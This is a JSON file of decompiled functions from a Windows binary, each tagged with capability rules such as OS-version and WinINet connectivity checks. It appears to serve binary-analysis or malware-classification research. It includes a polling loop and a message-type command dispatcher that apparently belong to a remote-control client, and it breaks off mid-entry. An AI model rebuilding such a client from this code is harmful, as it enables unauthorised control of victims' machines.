{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401000(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    // [00] -r-x section size 90112 named .text\n    if (arg_10h != 0) {\n        for (; (arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1) {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 148
    },
    "0040102c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040102c(uchar *arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    uchar *puVar1;\n    \n    puVar1 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            arg_10h = arg_10h + -1;\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "004010d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint16_t * fcn.004010d5(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    \n    if (*param_2 != 0) {\n        iVar1 = *param_1;\n        if (iVar1 != 0) {\n            iVar3 = param_1 - param_2;\n            piVar2 = param_2;\njoined_r0x004010fb:\n            do {\n                if (iVar1 != 0) {\n                    if (*piVar2 == 0) {\n                        return param_1;\n                    }\n                    if (*(iVar3 + piVar2) == *piVar2) {\n                        iVar1 = *(iVar3 + piVar2 + 1);\n                        piVar2 = piVar2 + 1;\n                        goto joined_r0x004010fb;\n                    }\n                }\n                if (*piVar2 == 0) {\n                    return param_1;\n                }\n                param_1 = param_1 + 1;\n                iVar1 = *param_1;\n                iVar3 = iVar3 + 2;\n                piVar2 = param_2;\n            } while (iVar1 != 0);\n        }\n        param_1 = NULL;\n    }\n    return param_1;\n}\n",
        "token_count": 289
    },
    "00401f98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401f98(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*param_1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "004021ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004021ed(uint dwMilliseconds)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if (*in_ECX != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*in_ECX, dwMilliseconds);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "004022e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004022e8(int32_t **param_1)\n\n{\n    if ((**param_1 != 0) && (*(param_1 + 1) != '\\0')) {\n        fcn.00401099(**param_1);\n        **param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004025f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004025f0(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (param_1[4] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[4]);\n    }\n    fcn.00405feb();\n    if (*param_1 != 0) {\n        fcn.00406034(unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 108
    },
    "00402b4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402b4b(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    param_2 = param_2 + 4;\n    uVar2 = fcn.004034d1(\"start\");\n    iVar3 = fcn.004034b5(uVar2);\n    if ((iVar3 == 0) || (*0x42662c != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.00405feb();\n    if (bVar1) {\n        fcn.004102d4(param_1);\n    }\n    else {\n        uVar2 = fcn.004034d1(\"exit\");\n        iVar3 = fcn.004034b5(uVar2);\n        fcn.00405feb();\n        if (iVar3 == 0) {\n            fcn.00403507(param_2);\n            fcn.004101ef(param_2);\n        }\n        else {\n            *0x42662c = 0;\n            fcn.0040ffa8();\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "0040319e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040319e(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "00403237": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403237(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.00405feb();\n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403484();\n        uVar1 = fcn.00405f68();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00403373": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403373(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 72
    },
    "00403484": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403484(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "00403496": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403496(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n    return iVar1 * 2 + 2;\n}\n",
        "token_count": 79
    },
    "00403507": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403507(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403484();\n        uVar1 = fcn.00405ffa();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00403549": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403549(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403496();\n        uVar1 = fcn.00405f68();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0040362f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040362f(uint arg_8h)\n\n{\n    uint lpString2;\n    int32_t *in_ECX;\n    \n    if (*in_ECX == 0) {\n        lpString2 = 0;\n    }\n    else {\n        lpString2 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(*in_ECX);\n    }\n    fcn.004036f7(lpString2);\n    return arg_8h;\n}\n",
        "token_count": 103
    },
    "0040373f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040373f(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403373();\n        uVar1 = fcn.00405ffa();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "00403a4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a4b(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    *(in_ECX + 4) = **arg_8h;\n    *(in_ECX + 8) = *(*arg_8h + 4) != '\\0';\n    arg_8h_00 = fcn.00402f87(&var_8h, 9, *(*arg_8h + 5));\n    fcn.00402fce(arg_8h_00);\n    fcn.00403148();\n    return;\n}\n",
        "token_count": 145
    },
    "00404f74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404f74(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *arg_8h;\n    uchar *hostshort;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint var_10h;\n    uint var_8h;\n    \n    *(param_1 + 0x244) = 1;\n    do {\n        uStack44 = 0x404f9a;\n        iVar1 = fcn.00405db3(&fcn.00404f74::var_10h);\n        uStack44 = *(iVar1 + 4);\n        arg_8h = &fcn.00404f74::var_8h;\n        hostshort = &stack0xffffffd0;\n        fcn.00405db3(arg_8h);\n        fcn.00403666(arg_8h);\n        iVar1 = fcn.0040594b(arg_8h, hostshort);\n        fcn.00405feb();\n        var_8h = 0;\n        fcn.00405feb();\n        var_10h = 0;\n        if (iVar1 != 0) {\n            fcn.0040577f(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(*(param_1 + 0x210));\n    } while (*(param_1 + 0x244) != 0);\n    return;\n}\n",
        "token_count": 311
    },
    "0040507e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040507e(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t *piVar4;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    iVar2 = *(in_ECX + 0x18);\n    var_8h = in_ECX;\n    if (iVar2 == 0) {\n        if (*(in_ECX + 0x14) < 0xc) {\n            return;\n        }\n        piVar4 = *(in_ECX + 0x10);\n        if (*piVar4 != -0x4a5bb661) {\n            fcn.004030fe();\n            iVar2 = *(in_ECX + 0x18);\n            goto code_r0x004050c8;\n        }\n        *(in_ECX + 0x28) = piVar4[1];\n        *(in_ECX + 0x2c) = piVar4[2];\n        *(in_ECX + 0x18) = 1;\n    }\n    else {\ncode_r0x004050c8:\n        if (iVar2 != 1) {\n            return;\n        }\n    }\n    var_10h = *(in_ECX + 0x14) - 0xc;\n    if (var_10h < *(in_ECX + 0x28)) {\n        return;\n    }\n    fcn.004030cc(*(in_ECX + 0x10) + 0xc, *(in_ECX + 0x28));\n    uVar1 = *(in_ECX + 0x2c);\n    piVar4 = NULL;\n    if (uVar1 < 0x25) {\n        if (uVar1 == 0x24) {\n            piVar4 = fcn.00406099();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x4177a0;\n                goto code_r0x00405608;\n            }\n            goto code_r0x00405606;\n        }\n        if (uVar1 < 0x13) {\n            if (uVar1 == 0x12) {\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x417760;\n                    goto code_r0x00405608;\n                }\n            }\n            else {\n                if (8 < uVar1) {\n                    if (uVar1 == 10) {\n                        piVar4 = fcn.00406099();\n                        if (piVar4 == NULL) goto code_r0x00405606;\n                        *piVar4 = 0x4176f8;\ncode_r0x0040515a:\n                        piVar4[1] = 0;\n                    }\n                    else if (uVar1 == 0xc) {\n                        piVar4 = fcn.00406099();\n                        if (piVar4 == NULL) goto code_r0x00405606;\n                        *piVar4 = 0x417738;\n                    }\n                    else if (uVar1 == 0xe) {\n                        iVar2 = fcn.00406099();\n                        if (iVar2 == 0) goto code_r0x00405606;\n                        piVar4 = fcn.00403da0();\n                    }\n                    else {\n                        if (uVar1 != 0x10) goto code_r0x00405610;\n                        piVar4 = fcn.00406099();\n                        if (piVar4 == NULL) goto code_r0x00405606;\n                        piVar4[1] = -1;\n                        *piVar4 = 0x417660;\n                    }\n                    goto code_r0x00405608;\n                }\n                if (uVar1 == 8) {\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x417708;\n                        goto code_r0x00405600;\n                    }\n                }\n                else if (uVar1 == 0) {\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x417720;\n                        goto code_r0x00405608;\n                    }\n                }\n                else if (uVar1 == 2) {\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x417758;\n                        goto code_r0x00405608;\n                    }\n                }\n                else if (uVar1 == 4) {\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x417748;\n                        goto code_r0x00405608;\n                    }\n                }\n                else {\n                    if (uVar1 != 6) goto code_r0x00405610;\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x417740;\n                        goto code_r0x0040515a;\n                    }\n                }\n            }\n            goto code_r0x00405606;\n        }\n        if (0x1c < uVar1) {\n            if (uVar1 == 0x1e) {\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x417790;\ncode_r0x004053a8:\n                    piVar4[3] = 0;\n                    piVar4[4] = 0;\n                    goto code_r0x00405608;\n                }\n            }\n            else if (uVar1 == 0x20) {\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x417750;\n                    goto code_r0x00405608;\n                }\n            }\n            else {\n                if (uVar1 != 0x22) goto code_r0x00405610;\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x417700;\n                    goto code_r0x0040515a;\n                }\n            }\n            goto code_r0x00405606;\n        }\n        if (uVar1 == 0x1c) {\n            piVar4 = fcn.00406099();\n            if (piVar4 == NULL) goto code_r0x00405606;\n            *piVar4 = 0x4177d0;\n            piVar4[2] = 0;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n        }\n        else if (uVar1 == 0x14) {\n            piVar4 = fcn.00406099();\n            if (piVar4 == NULL) goto code_r0x00405606;\n            *piVar4 = 0x4177b0;\n        }\n        else if (uVar1 == 0x16) {\n            piVar4 = fcn.00406099();\n            if (piVar4 == NULL) goto code_r0x00405606;\n            *piVar4 = 0x4177c0;\n        }\n        else if (uVar1 == 0x18) {\n            piVar4 = fcn.00406099();\n            if (piVar4 == NULL) goto code_r0x00405606;\n            *piVar4 = 0x417768;\n        }\n        else {\n            if (uVar1 != 0x1a) goto code_r0x00405610;\n            piVar4 = fcn.00406099();\n            if (piVar4 == NULL) goto code_r0x00405606;\n            *piVar4 = 0x4177c8;\n        }\n    }\n    else {\n        if (uVar1 < 0x39) {\n            if (uVar1 == 0x38) {\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x417780;\n                    goto code_r0x00405608;\n                }\n            }\n            else {\n                if (uVar1 < 0x2f) {\n                    if (uVar1 == 0x2e) {\n                        iVar2 = fcn.00406099();\n                        if (iVar2 == 0) goto code_r0x00405428;\n                        puVar3 = fcn.00403fcf();\n                        goto code_r0x0040542a;\n                    }\n                    if (uVar1 == 0x26) {\n                        piVar4 = fcn.00406099();\n                        if (piVar4 == NULL) goto code_r0x00405606;\n                        *piVar4 = 0x4177b8;\n                    }\n                    else if (uVar1 == 0x28) {\n                        piVar4 = fcn.00406099();\n                        if (piVar4 == NULL) goto code_r0x00405606;\n                        *piVar4 = 0x4177a8;\n                    }\n                    else {\n                        if (uVar1 == 0x2a) {\n                            puVar3 = fcn.00406099();\n                            if (puVar3 == NULL) {\ncode_r0x00405428:\n                                puVar3 = NULL;\n                            }\n                            else {\n                                *puVar3 = 0x4177d8;\n                                puVar3[1] = 0x4177e0;\n                            }\n                        }\n                        else {\n                            if (uVar1 != 0x2c) goto code_r0x00405610;\n                            puVar3 = fcn.00406099();\n                            if (puVar3 == NULL) goto code_r0x00405428;\n                            *puVar3 = 0x417800;\n                            puVar3[1] = 0x4177f8;\n                        }\ncode_r0x0040542a:\n                        piVar4 = -(puVar3 != NULL) & puVar3 + 1;\n                    }\n                    goto code_r0x00405608;\n                }\n                if (uVar1 == 0x30) {\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41a8b8;\n                        goto code_r0x00405608;\n                    }\n                }\n                else if (uVar1 == 0x32) {\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41a8c0;\n                        goto code_r0x00405608;\n                    }\n                }\n                else {\n                    if (uVar1 != 0x36) goto code_r0x00405610;\n                    piVar4 = fcn.00406099();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41a810;\n                        goto code_r0x0040515a;\n                    }\n                }\n            }\n        }\n        else if (uVar1 < 0x43) {\n            if (uVar1 == 0x42) {\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x417730;\n                    goto code_r0x00405608;\n                }\n            }\n            else if (uVar1 == 0x3a) {\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x41a7ac;\n                    goto code_r0x00405600;\n                }\n            }\n            else {\n                if (uVar1 != 0x3c) {\n                    if (uVar1 == 0x3e) {\n                        fcn.00412f55();\n                    }\n                    else if (uVar1 == 0x40) {\n                        fcn.0041313a();\n                    }\n                    goto code_r0x00405610;\n                }\n                piVar4 = fcn.00406099();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x41a8a8;\n                    goto code_r0x00405608;\n                }\n            }\n        }\n        else if (uVar1 == 0x44) {\n            piVar4 = fcn.00406099();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x417778;\ncode_r0x00405600:\n                piVar4[2] = 0;\n                goto code_r0x00405608;\n            }\n        }\n        else if (uVar1 == 0x48) {\n            piVar4 = fcn.00406099();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x417728;\n                goto code_r0x004053a8;\n            }\n        }\n        else {\n            if (uVar1 != 0x4a) goto code_r0x00405610;\n            piVar4 = fcn.00406099();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x417710;\n                goto code_r0x00405600;\n            }\n        }\ncode_r0x00405606:\n        piVar4 = NULL;\n    }\ncode_r0x00405608:\n    (**(*piVar4 + 4))(in_ECX + 0x30);\ncode_r0x00405610:\n    (***arg_8h)(*(var_8h + 0x2c), piVar4);\n    if (var_10h < *(var_8h + 0x28) || var_10h == *(var_8h + 0x28)) {\n        fcn.004030fe();\n    }\n    else {\n        fcn.0040315e(var_8h + 0x10);\n        fcn.00402f87(&var_14h, *(var_8h + 0x28) + 0xc, (*(var_8h + 0x14) - *(var_8h + 0x28)) + -0xc);\n        fcn.00402fce(&var_14h);\n        *(var_8h + 0x18) = 0;\n        fcn.0040507e(arg_8h);\n        fcn.00403148();\n        fcn.00403148();\n    }\n    if (*(var_8h + 0x34) != 0) {\n        fcn.004030fe();\n    }\n    *(var_8h + 0x18) = 0;\n    return;\n}\n",
        "token_count": 3281
    },
    "00405a61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405a61(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    if (*(in_ECX + 4) == 0) {\n        arg_8h_00 = fcn.00402f87(&var_8h, 4, **(in_ECX + 0x4c));\n        fcn.00402fce(arg_8h_00);\n        fcn.00403148();\n        *(in_ECX + 4) = 1;\n    }\n    fcn.0040315e(in_ECX + 8);\n    return arg_8h;\n}\n",
        "token_count": 154
    },
    "00406077": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406077(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00401052();\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "00407501": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407501(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint unaff_EBX;\n    uint32_t arg_8h_00;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint in_stack_ffffff84;\n    uint uVar4;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    int32_t iStack72;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint32_t uStack24;\n    \n    uVar2 = *(arg_8h + 0x14);\n    fcn.004036f7(uVar2);\n    fcn.004079f6(uVar2);\n    if (iStack72 == 0) {\n        uVar4 = 0;\n        uVar3 = 0;\n        uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                          (*(arg_8h + 0x14), extraout_ECX, uStack32, 0, 0, 0, &stack0xffffff84, 2);\n        fcn.004036f7(uVar2);\n        uVar2 = fcn.004041b7(*(arg_8h + 0x18), uVar2, unaff_EDI, unaff_ESI, unaff_EBX, uVar4, uVar3, in_stack_ffffff8c);\n        fcn.00405044(uVar2);\n        fcn.0040411d();\n        fcn.00403148();\n    }\n    else {\n        arg_8h_00 = 0;\n        if (uStack24 != 0) {\n            do {\n                uVar2 = 0;\n                if (*(*(arg_8h + 4) + 0xc) == 0) break;\n                uVar4 = uVar2;\n                uVar3 = uVar2;\n                iVar1 = fcn.00407981(arg_8h_00, &stack0xffffff7c);\n                if (iVar1 == 0) {\n                    uVar4 = uVar2;\n                    uVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (*(arg_8h + 0x14), extraout_ECX_00, uStack40, 0, 0, 0, &stack0xffffff7c, 1);\n                    fcn.004036f7(uVar3);\n                    uVar2 = fcn.004041b7(*(arg_8h + 0x18), uVar3, unaff_EDI, uVar2, uVar4, in_stack_ffffff84, \n                                         in_stack_ffffff88, in_stack_ffffff8c);\n                    fcn.00405044(uVar2);\n                    fcn.0040411d();\n                    fcn.00403148();\n                }\n                else {\n                    uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (*(arg_8h + 0x14), extraout_ECX_00, uStack40, arg_8h_00, uStack32, uStack36, \n                                       &stack0xffffff74, 0);\n                    fcn.004036f7(uVar2);\n                    uVar2 = fcn.004041b7(*(arg_8h + 0x18), uVar2, unaff_EDI, uVar4, uVar3, in_stack_ffffff84, \n                                         in_stack_ffffff88, in_stack_ffffff8c);\n                    fcn.00405044(uVar2);\n                    fcn.0040411d();\n                }\n                fcn.00403148();\n                arg_8h_00 = arg_8h_00 + 1;\n            } while (arg_8h_00 < uStack24);\n        }\n    }\n    if (iStack72 != 0) {\n        fcn.00411644();\n    }\n    fcn.004076ba(*(arg_8h + 4), *(arg_8h + 0x18), 0);\n    fcn.00407929();\n    fcn.00403148();\n    return 0;\n}\n",
        "token_count": 944
    },
    "004076ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
